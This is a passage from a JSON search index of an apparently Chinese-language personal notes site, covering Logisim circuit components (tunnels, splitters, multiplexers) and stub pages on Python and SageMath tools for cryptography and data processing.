<p></p>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#tunnel","title":"Tunnel\uff08\u96a7\u9053\uff09","text":"<p>\u96a7\u9053\u8d77\u5230\u4e00\u4e2a\u4f20\u8f93\u4fe1\u53f7\u7684\u4f5c\u7528\uff0c\u540c\u540d\u96a7\u9053\u4ee3\u8868\u540c\u4e00\u4e2a\u503c</p> <p></p>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#splitter","title":"splitter\uff08\u5206\u7ebf\u5668\uff09","text":"<p>\u6211\u4eec\u5e38\u9700\u8981\u5c06\u4f4d\u5bbd\u5408\u5e76\uff0c\u76f4\u63a5\u76f8\u8fde\u662f\u4e0d\u53ef\u884c\u7684</p> <p></p> <p>\u5206\u7ebf\u5668\u5c31\u662f\u7528\u4e8e\u5c06\u4fe1\u53f7\u5206\u8def/\u5408\u5e76\u7684</p> <p></p> <p>\u6ce8\u610f\u8c03\u8bbe\u4f4d\u5bbd\u7b49\uff0c\u5c0f\u6570\u5b57\u6697\u793a\u4e86\u8f93\u51fa\u4f4d\u7f6e</p> <p>\u4e5f\u53ef\u4ee5\u7528\u4e8e\u622a\u53d6\u4fe1\u53f7\uff0c\u5de6\u4fa7\u9762\u677f\u8c03\u8282\u6bcf\u4e2a\u53e3\u7684\u4fe1\u53f7\u6e90</p> <p></p> <p>\u5176\u4ed6 wiring \u5de5\u5177\u6211\u4eec\u5728\u540e\u9762\u9047\u5230\u518d\u8fdb\u884c\u8bb2\u89e3</p>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#mux","title":"MUX\uff08\u591a\u8def\u9009\u62e9\u5668\uff09","text":"<p>\u591a\u8def\u9009\u62e9\u5668\u00b6\uff08Multiplexer\uff09\u5728\u590d\u7528\u5668 Plexers \u4e2d</p> <p></p> <p>\u5982\u56fe\uff0c<code>select bits</code> (\u8bb0\u4e3a n) \u4ee3\u8868\u9009\u62e9\u7aef\u4fe1\u53f7\u7684\u4f4d\u6570\uff0c\u8f93\u5165\u7aef\u53e3\u6570\u5373\u4e3a \\(2^{n}\\) \uff1b</p> <p><code>data bits</code> \u5373\u6570\u636e\u4f4d\u5bbd\uff0c\u8981\u6c42\u8f93\u5165\u7aef\uff08\u6bcf\u4e00\u4e2a\uff09\u3001\u591a\u8def\u9009\u62e9\u5668\u3001\u8f93\u51fa\u7aef\u4e00\u81f4</p> <p>\u5728\u56fe\u4e2d\uff0c\u7531\u4e0a\u81f3\u4e0b\u4f9d\u6b21\u4e3a \\(0,1,2\\dots 2^{n}-1\\) \u63a5\u53e3\uff0c\u9009\u62e9\u7aef\u7684\u8f93\u5165\u5373\u8868\u793a\u9009\u62e9\u51e0\u53f7\u63a5\u53e3\u7684\u8f93\u5165</p>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#register","title":"Register\uff08\u5bc4\u5b58\u5668\uff09","text":"<p>(To be continue)</p>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#_5","title":"\u81ea\u5b9a\u4e49\u5c01\u88c5\u7535\u8def","text":"<p>(To be continue)</p>","tags":["begin"]},{"location":"tutorial/begin/logisim_begin/#_6","title":"\u53c2\u8003\u6587\u7ae0","text":"<p>https://blog.csdn.net/RuanFun/article/details/130795720</p> <p>https://blog.csdn.net/qq_44838412/article/details/107074857</p>","tags":["begin"]},{"location":"tutorial/python_learn/crypto/","title":"crypto","text":"<p>\u5b66\u4e60\u4e00\u4e0bcrypto\u4e2d\u5e38\u7528\u7684 python \u5e93\uff0c\u4ee5\u53ca sage \u7b49\u7684\u4f7f\u7528\u3002</p>"},{"location":"tutorial/python_learn/crypto/#_1","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>R1ck's Portal</li> <li>crypto\u5e38\u7528\u5de5\u5177</li> <li>Python 3.11 documentation</li> <li>sage\u5e38\u7528\u547d\u4ee4</li> <li>Sage Documentation</li> </ul>"},{"location":"tutorial/python_learn/crypto/sage_math/","title":"Sage math","text":"<p>\u5bf9\u4e8e\u5bc6\u7801\u5b66\u6765\u8bf4\uff0csagemath \u592a\u65b9\u4fbf\u4e86\u3002</p> <ul> <li>Sage math<ul> <li>sagecell online</li> <li>sage document<ul> <li>Cryptography part</li> </ul> </li> </ul> </li> </ul> <p>\u5bf9\u4e8e\u7b14\u8bb0\u4e2d\u7684\u51fd\u6570\u7b7e\u540d\uff0c\u6211\u53ea\u662f\u6311\u9009\u4e86\u5e38\u9700\u8981\u4fee\u6539\u7684\u53c2\u6570\uff0c\u5b8c\u6574\u7684\u53c2\u6570\u5217\u8868\u8bf7\u53c2\u8003\u6587\u6863\u3002</p>","tags":["notes","crypto"]},{"location":"tutorial/python_learn/data/","title":"Data","text":"<p>\u6570\u636e\u5904\u7406\u5e38\u7528 python \u5e93\u3002</p>"},{"location":"archive/2025/","title":"2025","text":""},{"location":"archive/2024/","title":"2024","text":""}]}